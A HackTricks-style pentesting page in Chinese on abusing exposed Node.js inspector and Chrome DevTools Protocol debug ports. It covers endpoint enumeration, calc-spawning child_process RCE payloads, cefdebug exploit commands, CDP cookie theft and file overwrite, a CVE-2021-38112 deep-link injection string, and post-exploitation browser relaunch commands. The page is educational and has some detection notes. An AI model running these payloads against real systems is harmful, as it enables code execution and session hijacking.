# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

历史上的实际示例包括 Multimaster walkthrough 和 CVE-2019-1414 Visual Studio Code debugger attack；应将它们作为特定版本的背景参考，而不要假设所有当前的 Electron 或 Chromium target 都暴露相同的 primitives。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本信息

[根据文档](https://nodejs.org/learn/getting-started/debugging)：使用 `--inspect` switch 启动时，Node.js process 会监听 debugging client。**默认情况下**，它将在 host 和 port **`127.0.0.1:9229`** 上监听。每个 process 还会被分配一个**唯一**的 **UUID**。<sup>[[4]](#references)</sup>

Inspector clients 必须知道并指定 host address、port 和 UUID 才能连接。完整 URL 看起来类似于 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> 由于 **debugger 可以完全访问 Node.js execution environment**，能够连接到此 port 的恶意 actor 可能代表 Node.js process 执行 arbitrary code（**potential privilege escalation**）。<sup>[[4]](#references)</sup>

启动 inspector 有多种方式：<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当你启动一个被检查的进程时，会出现类似以下内容：<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于 **CEF**（**Chromium Embedded Framework**）的进程可以通过 `--remote-debugging-port=9222` 暴露 debugger。它通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 暴露 browser，而不是 Node.js inspector，因此默认情况下，基于 Node.js `process` 的 payload 不可直接使用。<sup>[[2]](#references)[[5]](#references)</sup>

当你启动一个启用了 debugger 的 browser 时，会出现类似以下内容：<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 枚举并驱动 CDP endpoint

HTTP discovery endpoints 会区分 **browser** WebSocket 与各个 **target**（标签页、worker、extension 等）WebSocket。查询 `/json/version` 获取 browser endpoint，查询 `/json/list` 获取 targets；随后即可使用 CDP 的类 JSON-RPC 消息直接驱动返回的 `webSocketDebuggerUrl` 值。<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
例如，使用 `websocat "$BROWSER_WS"` 连接，并发送 `{"id":1,"method":"Target.getTargets"}` 或 `{"id":2,"method":"Storage.getCookies"}`。在页面 target（`websocat "$PAGE_WS"`）上，`Runtime.evaluate` 会在该 renderer 中执行，而 `Page.captureScreenshot` 会返回 base64 编码的截图。`document.cookie` 无法显示 `HttpOnly` cookies，而 `Storage.getCookies` 会向浏览器请求其 cookie store。<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 web-browser 中打开的网站可以根据浏览器安全模型发起 WebSocket 和 HTTP 请求。必须建立**初始 HTTP 连接**才能**获取唯一的 debugger session id**。**same-origin-policy** **阻止**网站建立**此 HTTP 连接**。为了进一步防御 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的**'Host' headers**是否精确指定了**IP 地址**或**`localhost`**。<sup>[[4]](#references)</sup>

> [!TIP]
> 这些**安全措施可防止仅通过发送 HTTP 请求来利用 inspector**运行代码（通过利用 SSRF vuln 即可做到这一点）。<sup>[[4]](#references)</sup>

### 在运行中的进程内启动 inspector

你可以向正在运行的 nodejs process 发送**信号 SIGUSR1**，使其在默认端口**启动 inspector**。但是请注意，你需要拥有足够的权限，因此这可能会授予你对**进程内部信息的特权访问权限**，但不会直接导致权限提升。<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 这在容器中很有用，因为使用 `--inspect` **关闭进程并启动新进程** **并不可行**，因为 **容器** 会随进程一起被**终止**。<sup>[[6]](#references)</sup>

### 连接到 inspector/debugger

要连接到基于 **Chromium 的浏览器**，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保已正确列出 **目标主机和端口**。该图展示了一个 Remote Code Execution (RCE) 示例：<sup>[[2]](#references)[[4]](#references)</sup>

![访问 debugger 的 URL 将会出现，例如 ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的浏览器，...](<../../images/image (674).png>)

使用**命令行**可以通过以下方式连接到 debugger/inspector：<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可用于**查找**本地运行的 inspectors，并向其中**注入代码**。<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits** 将无法奏效（你需要检查 API，以找到可以利用它执行的有趣操作）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector 中的 RCE

> [!TIP]
> 如果你是来了解如何从 Electron 中的 [**XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

当你可以**连接**到 Node **inspector** 时，获取 **RCE** 的一些常见方法是使用类似以下的方式（看起来这**无法通过与 Chrome DevTools protocol 的连接工作**）：<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

你可以在此处查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
本节将列出我发现有人利用此 protocol 进行 exploit 的一些有趣方式。

### Chrome 136+ 默认 profile 限制

从 **Chrome 136** 开始，当 `--remote-debugging-port` 和 `--remote-debugging-pipe` 指向 **默认 Chrome data directory** 时，Chrome 会忽略它们。该 switch 必须与非标准的 `--user-data-dir` 配合使用；后者使用独立的 encryption key 和隔离的 browser state，从而防止简单的基于 flag 的 technique 暴露用户正常的 authenticated profile。未经验证，不应认为此 Chrome-specific 限制适用于旧版 Chrome、Chrome for Testing、Electron/CEF applications 或其他 Chromium derivatives。<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
因此，仅看到当前 Chrome 进程带有 `--remote-debugging-port` 启动，**并不能证明 CDP 已激活**。请确认 listener 和 `/json/version`，并确定实际为其提供支持的 profile。<sup>[[14]](#references)</sup>

### 通过 Deep Links 注入参数

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino security 发现，一个基于 CEF 的应用程序在系统中**注册了一个自定义 UR**I（workspaces://index.html），该 URI 会接收完整 URI，随后以一个由该 URI 部分构造的配置**启动基于 CEF 的应用程序**。<sup>[[8]](#references)</sup>

研究发现，URI 参数会经过 URL 解码，并用于启动 CEF basic application，使用户能够在**命令行**中**注入** **`--gpu-launcher`** flag 并执行任意操作。<sup>[[8]](#references)</sup>

因此，类似这样的 payload：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行 calc.exe。<sup>[[8]](#references)</sup>

### 覆盖文件

更改**下载文件的保存位置**，并下载一个文件，以使用你的**恶意代码**覆盖应用程序经常使用的**源代码**。<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 和 exfiltration

STAR Labs 证明，暴露的 WebDriver/CDP 服务可以实现任意文件读取和 RCE；在某些配置中，DNS rebinding 可以完成整个 exploit chain。<sup>[[9]](#references)</sup>

如需了解更多历史上的 browser-automation 和 Chromium security 案例，请参阅 Counter WebDriver write-up 以及 Project Zero issues 773、1742 和 1944。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 在运行中的 Chromium 进程内启用 CDP

在 Windows 上，[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) 证明，命令行限制并不是激活 CDP 的唯一方式：已经能够注入现有 `msedge.exe` 的代码可以调用 Chromium 未导出的 `content::DevToolsAgentHost::StartRemoteDebuggingServer`，在无需重启 browser 的情况下暴露已认证的 live profile。<sup>[[15]](#references)</sup>

该 chain 会使用 `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` 注入 DLL，解析 Edge 内部 symbols（先从 PDB 中解析，然后使用特定版本的 byte signatures），对 browser window 进行 subclass，并发送消息，使最终的 server-start 调用在 browser **UI thread** 上执行。socket 会绑定到 loopback，之后普通的 CDP primitives 就可以获取 cookies、捕获 tabs、检查 network traffic，或在已认证的页面中执行 JavaScript。<sup>[[15]](#references)</sup>

> [!WARNING]
> 这是一种 **post-compromise/process-injection** 技术，而不是未经认证的 network bypass。它高度依赖具体 build，因为相关 C++ symbols 未导出，并且 signatures 可能在 browser 更新后发生变化。<sup>[[15]](#references)</sup>

在 detection 方面，不要只依赖 `--remote-debugging-*` command-line telemetry：还应关联针对 browser processes 的异常 handles 和 memory operations（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、thread creation）、DLL injection，以及由 Chrome/Edge 持有的异常 loopback listening sockets。<sup>[[15]](#references)</sup>

### Post-Exploitation

在真实环境中，**compromising** 使用 Chromium-based browser 的用户 PC 之后，一种历史 technique 是重新启动 browser、启用 debugging 并转发 loopback port。对于仍接受所选 profile 的产品/build，这可能会暴露受害者的 browsing state，但 Chrome 136+ 不会对其 default data directory 执行此操作。<sup>[[7]](#references)[[14]](#references)</sup>

下面保留了适用于较旧版本或特定版本 target 的原始 relaunch command。第二条 command 是当前 Chrome 支持的形式，但它会创建 isolated profile，而不是重新打开受害者原本的 authenticated state。<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
对于 macOS-specific Chromium relaunch、extension 和 CDP tradecraft，请参阅 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger 检查与 exploitation 工具](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414：通过 Chrome DevTools Debugger 实现 Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - 入门](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme（Larry Yuan）](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation：滥用 Chrome 的 Debugging Feature 远程观察和控制 Browsing Sessions](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112：AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - 通过 DNS Rebinding 和 CDP 实现 WebDriver RCE（STAR Labs）](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - 从 Bot 到 RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [改进安全性的 remote debugging switches 变更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser：深入探究 Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
